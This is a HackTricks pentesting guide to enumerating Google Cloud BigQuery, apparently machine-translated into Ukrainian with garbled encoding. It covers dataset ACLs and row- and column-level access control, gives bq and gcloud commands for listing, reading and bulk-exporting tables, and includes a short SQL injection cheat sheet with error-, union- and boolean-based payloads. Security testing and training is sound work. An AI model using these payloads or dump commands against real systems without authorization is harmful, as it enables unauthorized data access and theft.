# GCP - Bigquery Enum

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –•–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–®–∫–æ–ª–∞ –•–∞–∫—ñ–Ω–≥—É HackTricks –ï–∫—Å–ø–µ—Ä—Ç AWS Red Team (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –•–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–®–∫–æ–ª–∞ –•–∞–∫—ñ–Ω–≥—É HackTricks –ï–∫—Å–ø–µ—Ä—Ç GCP Red Team (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥-–ø—Ä–∏–π–æ–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

Google Cloud BigQuery - —Ü–µ **–ø–æ–≤–Ω—ñ—Å—Ç—é –∫–µ—Ä–æ–≤–∞–Ω–µ, –±–µ–∑—Å–µ—Ä–≤–µ—Ä–Ω–µ –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–µ —Å—Ö–æ–≤–∏—â–µ –¥–∞–Ω–∏—Ö**, —è–∫–µ –ø—Ä–æ–ø–æ–Ω—É—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è **–∞–Ω–∞–ª—ñ–∑—É –ø–µ—Ç–∞–±–∞–π—Ç—ñ–≤** –¥–∞–Ω–∏—Ö, —Ç–∏–º —Å–∞–º–∏–º –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—Ä–æ–±–ª—è—é—á–∏ –≤–µ–ª–∏–∫—ñ –Ω–∞–±–æ—Ä–∏ –¥–∞–Ω–∏—Ö. –Ø–∫ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ —è–∫ –°–µ—Ä–≤—ñ—Å (PaaS), –≤–æ–Ω–∞ –Ω–∞–¥–∞—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º —ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –¥–∞–Ω–∏–º–∏ –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —Ä—É—á–Ω–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—é.

–í–æ–Ω–∞ –ø—ñ–¥—Ç—Ä–∏–º—É—î –∑–∞–ø–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **ANSI SQL**. –û—Å–Ω–æ–≤–Ω—ñ –æ–±'—î–∫—Ç–∏ - —Ü–µ **–Ω–∞–±–æ—Ä–∏ –¥–∞–Ω–∏—Ö**, —â–æ –º—ñ—Å—Ç—è—Ç—å **—Ç–∞–±–ª–∏—Ü—ñ**, —â–æ –º—ñ—Å—Ç—è—Ç—å SQL **–¥–∞–Ω—ñ**.

### –®–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **—à–∏—Ñ—Ä—É–≤–∞–ª—å–Ω–∏–π –∫–ª—é—á, –∫–µ—Ä–æ–≤–∞–Ω–∏–π Google**, —Ö–æ—á–∞ –º–æ–∂–ª–∏–≤–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ **—à–∏—Ñ—Ä—É–≤–∞–ª—å–Ω–∏–π –∫–ª—é—á, –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∫–ª—ñ—î–Ω—Ç–æ–º (CMEK)**. –ú–æ–∂–ª–∏–≤–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–ª—é—á —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö —Ç–∞ –¥–ª—è –∫–æ–∂–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö.

### –¢–µ—Ä–º—ñ–Ω –¥—ñ—ó

–ú–æ–∂–ª–∏–≤–æ –≤–∫–∞–∑–∞—Ç–∏ **—Ç–µ—Ä–º—ñ–Ω –¥—ñ—ó –≤ –Ω–∞–±–æ—Ä—ñ –¥–∞–Ω–∏—Ö**, —â–æ–± –±—É–¥—å-—è–∫–∞ –Ω–æ–≤–∞ —Ç–∞–±–ª–∏—Ü—è, —Å—Ç–≤–æ—Ä–µ–Ω–∞ –≤ —Ü—å–æ–º—É –Ω–∞–±–æ—Ä—ñ –¥–∞–Ω–∏—Ö, –±—É–ª–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–¥–∞–ª–µ–Ω–∞** —á–µ—Ä–µ–∑ –≤–∫–∞–∑–∞–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥–Ω—ñ–≤ –ø—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è.

### –ó–æ–≤–Ω—ñ—à–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞

Bigquery –≥–ª–∏–±–æ–∫–æ —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π –∑ —ñ–Ω—à–∏–º–∏ —Å–µ—Ä–≤—ñ—Å–∞–º–∏ Google. –ú–æ–∂–ª–∏–≤–æ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑ –±–∞–∫–µ—Ç—ñ–≤, pub/sub, google drive, –±–∞–∑ –¥–∞–Ω–∏—Ö RDS...

### ACL –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö

–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö –¥–æ –Ω—å–æ–≥–æ **–ø—Ä–∏–∫—Ä—ñ–ø–ª—é—é—Ç—å—Å—è ACL**, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞–¥–∞—é—Ç—å—Å—è –ø—Ä–∏–≤—ñ–ª–µ—ó **–í–ª–∞—Å–Ω–∏–∫–∞** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ, —è–∫–∏–π —Å—Ç–≤–æ—Ä–∏–≤ –Ω–∞–±—ñ—Ä –¥–∞–Ω–∏—Ö, –∞ –ø–æ—Ç—ñ–º **–í–ª–∞—Å–Ω–∏–∫** –≥—Ä—É–ø—ñ **projectOwners** (–í–ª–∞—Å–Ω–∏–∫–∏ –ø—Ä–æ–µ–∫—Ç—É), **–ü–∏—Å—å–º–µ–Ω–Ω–∏–∫** –≥—Ä—É–ø—ñ **projectWriters** —Ç–∞ **–ß–∏—Ç–∞—á** –≥—Ä—É–ø—ñ **projectReaders**:
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### –ö–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä—è–¥–∫—ñ–≤ —Ç–∞–±–ª–∏—Ü—ñ

–Ñ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —Ä—è–¥–∫–∏, –¥–æ —è–∫–∏—Ö —Å—É–±'—î–∫—Ç –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ–ª—ñ—Ç–∏–∫ –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä—è–¥–∫—ñ–≤. –í–æ–Ω–∏ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create\_row\_access\_policy\_statement).\
–ü–æ–ª—ñ—Ç–∏–∫–∞ –¥–æ—Å—Ç—É–ø—É –≤–∏–∑–Ω–∞—á–∞—î —Ñ—ñ–ª—å—Ç—Ä, —ñ **–ª–∏—à–µ —Ä—è–¥–∫–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ü—å–æ–º—É —Ñ—ñ–ª—å—Ç—Ä—É**, –±—É–¥—É—Ç—å **–¥–æ—Å—Ç—É–ø–Ω—ñ** –¥–ª—è –≤–∫–∞–∑–∞–Ω–∏—Ö —Å—É–±'—î–∫—Ç—ñ–≤.
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### –ö–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Å—Ç–æ–≤–ø—Ü—ñ–≤

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

–î–ª—è –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∞–Ω–∏—Ö –Ω–∞ —Ä—ñ–≤–Ω—ñ —Å—Ç–æ–≤–ø—Ü—ñ–≤:

1. **–í–∏–∑–Ω–∞—á—Ç–µ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—é —Ç–∞ —Ç–µ–≥–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏**. –°—Ç–≤–æ—Ä—ñ—Ç—å —Ç–∞ –∫–µ—Ä—É–π—Ç–µ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—î—é —Ç–∞ —Ç–µ–≥–∞–º–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ –¥–ª—è –≤–∞—à–∏—Ö –¥–∞–Ω–∏—Ö. [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. –ù–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ: –ù–∞–¥–∞–π—Ç–µ —Ä–æ–ª—å **–ß–∏—Ç–∞—á–∞ –∑ –¥—Ä—ñ–±–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏ –∫–∞—Ç–∞–ª–æ–≥—É –¥–∞–Ω–∏—Ö** –æ–¥–Ω–æ–º—É –∞–±–æ –¥–µ–∫—ñ–ª—å–∫–æ–º –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞–º –Ω–∞ –æ–¥–Ω–æ–º—É –∞–±–æ –¥–µ–∫—ñ–ª—å–∫–æ—Ö —Ç–µ–≥–∞—Ö –ø–æ–ª—ñ—Ç–∏–∫–∏, —è–∫—ñ –≤–∏ —Å—Ç–≤–æ—Ä–∏–ª–∏.
3. **–ü—Ä–∏–∑–Ω–∞—á—Ç–µ —Ç–µ–≥–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ –¥–ª—è –≤–∞—à–∏—Ö —Å—Ç–æ–≤–ø—Ü—ñ–≤ BigQuery**. –£ BigQuery –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∞–Ω–æ—Ç–∞—Ü—ñ—ó —Å—Ö–µ–º–∏ –¥–ª—è –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–µ–≥–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–æ–∂–Ω–æ–º—É —Å—Ç–æ–≤–ø—Ü—é, –¥–æ —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –æ–±–º–µ–∂–∏—Ç–∏ –¥–æ—Å—Ç—É–ø.
4. **–ó–∞—Å—Ç–æ—Å—É–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—ó**. –ó–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –æ–±–º–µ–∂–µ–Ω—å –¥–æ—Å—Ç—É–ø—É, –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –¥–ª—è –≤—Å—ñ—Ö —Ç–µ–≥—ñ–≤ –ø–æ–ª—ñ—Ç–∏–∫–∏ –≤ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—ó.
5. **–ö–µ—Ä—É–π—Ç–µ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ —Ç–µ–≥—ñ–≤ –ø–æ–ª—ñ—Ç–∏–∫–∏**. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [Identity and Access Management](https://cloud.google.com/iam) (IAM) –ø–æ–ª—ñ—Ç–∏–∫–∏ –¥–ª—è –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–æ–∂–Ω–æ–≥–æ —Ç–µ–≥–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏. –ü–æ–ª—ñ—Ç–∏–∫–∞ –¥—ñ—î –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ —Å—Ç–æ–≤–ø—Ü—è, —è–∫–∏–π –Ω–∞–ª–µ–∂–∏—Ç—å –¥–æ —Ç–µ–≥–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏.

–ö–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–∞–Ω–∏—Ö —Å—Ç–æ–≤–ø—Ü—è –ø—ñ–¥ —á–∞—Å –∑–∞–ø–∏—Ç—É, BigQuery **–ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ç–µ–≥ –ø–æ–ª—ñ—Ç–∏–∫–∏ —Å—Ç–æ–≤–ø—Ü—è —Ç–∞ –π–æ–≥–æ –ø–æ–ª—ñ—Ç–∏–∫—É, —â–æ–± –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ –¥–æ—Å—Ç—É–ø –¥–æ –¥–∞–Ω–∏—Ö**.

{% hint style="success" %}
–£ –ø—ñ–¥—Å—É–º–∫—É, –¥–ª—è –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–µ—è–∫–∏—Ö —Å—Ç–æ–≤–ø—Ü—ñ–≤ –¥–ª—è –¥–µ—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Ç–µ–≥ –¥–æ —Å—Ç–æ–≤–ø—Ü—è –≤ —Å—Ö–µ–º—ñ —Ç–∞ –æ–±–º–µ–∂–∏—Ç–∏ –¥–æ—Å—Ç—É–ø –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ —Ç–µ–≥—É, –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—á–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—ó —Ç–µ–≥—É**.
{% endhint %}

–î–ª—è –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É –¥–æ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—ó –ø–æ—Ç—Ä—ñ–±–Ω–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ —Å–ª—É–∂–±—É:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
–ú–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Ç–µ–≥–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
### –ü–µ—Ä–µ–ª—ñ–∫

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### –í–Ω–µ–¥—Ä–µ–Ω–Ω—è SQL –≤ BigQuery

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –¥–æ–ø–∏—Å —É –±–ª–æ–∑—ñ: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac). –¢—É—Ç –±—É–¥—É—Ç—å –Ω–∞–≤–µ–¥–µ–Ω—ñ –ª–∏—à–µ –¥–µ—è–∫—ñ –¥–µ—Ç–∞–ª—ñ.

**–ö–æ–º–µ–Ω—Ç–∞—Ä—ñ**:

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` –ê–ª–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ –ª–∏—à–µ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç
* `select 1--from here it is not working`

–û—Ç—Ä–∏–º–∞–π—Ç–µ **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –ø—Ä–æ **—Å–µ—Ä–µ–¥–æ–≤–∏—â–µ**, —Ç–∞–∫—É —è–∫:

* –ü–æ—Ç–æ—á–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á: `select session_user()`
* –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –ø—Ä–æ–µ–∫—Ç—É: `select @@project_id`

–û–±'—î–¥–Ω–∞–π—Ç–µ —Ä—è–¥–∫–∏:

* –£—Å—ñ –Ω–∞–∑–≤–∏ —Ç–∞–±–ª–∏—Ü—å: `string_agg(table_name, ', ')`

–û—Ç—Ä–∏–º–∞–π—Ç–µ –Ω–∞–∑–≤–∏ **–Ω–∞–±–æ—Ä—ñ–≤ –¥–∞–Ω–∏—Ö**, **—Ç–∞–±–ª–∏—Ü—å** —Ç–∞ **—Å—Ç–æ–≤–ø—Ü—ñ–≤**:

* –ù–∞–∑–≤–∞ **–ø—Ä–æ–µ–∫—Ç—É** —Ç–∞ **–Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö**:

{% code overflow="wrap" %}
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

* **–ù–∞–∑–≤–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤** —Ç–∞ **—Ç–∞–±–ª–∏—Ü—å** **–≤—Å—ñ—Ö —Ç–∞–±–ª–∏—Ü—å** –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö: &#x20;

{% code overflow="wrap" %}
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **–Ü–Ω—à—ñ –Ω–∞–±–æ—Ä–∏ –¥–∞–Ω–∏—Ö** –≤ —Ç–æ–º—É –∂ –ø—Ä–æ–µ–∫—Ç—ñ:&#x20;

{% code overflow="wrap" %}
```sql
#¬†SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**–¢–∏–ø–∏ SQL Injection:**

* –û—Å–Ω–æ–≤–∞–Ω—ñ –Ω–∞ –ø–æ–º–∏–ª–∫–∞—Ö - –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–∏–ø—ñ–≤: `select CAST(@@project_id AS INT64)`
* –û—Å–Ω–æ–≤–∞–Ω—ñ –Ω–∞ –ø–æ–º–∏–ª–∫–∞—Ö - –¥—ñ–ª–µ–Ω–Ω—è –Ω–∞ –Ω—É–ª—å: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* –û—Å–Ω–æ–≤–∞–Ω—ñ –Ω–∞ –æ–±'—î–¥–Ω–∞–Ω–Ω—ñ (–Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ ALL –≤ bigquery): `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* –û—Å–Ω–æ–≤–∞–Ω—ñ –Ω–∞ –±—É–ª–µ–≤—ñ–π –ª–æ–≥—ñ—Ü—ñ: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* –ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –æ—Å–Ω–æ–≤–∞–Ω—ñ –Ω–∞ —á–∞—Å—ñ - –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—É–±–ª—ñ—á–Ω–∏—Ö –Ω–∞–±–æ—Ä—ñ–≤ –¥–∞–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è:**

* –£—Å—ñ —Ñ—É–Ω–∫—Ü—ñ—ó: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* –û–ø–µ—Ä–∞—Ç–æ—Ä–∏ —Å–∫—Ä–∏–ø—Ç—ñ–≤: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ç–∞ –ø–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### –ù–∞–ø–æ–ª–µ–≥–ª–∏–≤—ñ—Å—Ç—å

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
